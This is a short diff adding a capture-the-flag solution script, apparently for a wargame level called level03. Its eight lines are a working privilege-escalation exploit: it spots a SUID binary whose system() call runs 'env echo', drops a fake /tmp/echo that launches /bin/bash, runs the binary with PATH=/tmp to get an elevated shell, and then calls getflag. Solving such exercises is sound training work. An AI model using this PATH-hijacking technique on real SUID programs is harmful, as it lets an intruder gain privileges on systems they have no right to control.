@@ -1,0 +1,8 @@
+ls -la # Suid is set on level03
+r2|gdb level03
+# system is called with esp set to "/usr/bin/env echo Exploit me"
+# Let's replace echo in the path
+echo "/bin/bash" > /tmp/echo
+chmod +x /tmp/echo
+PATH=/tmp ./level03
+/bin/getflag
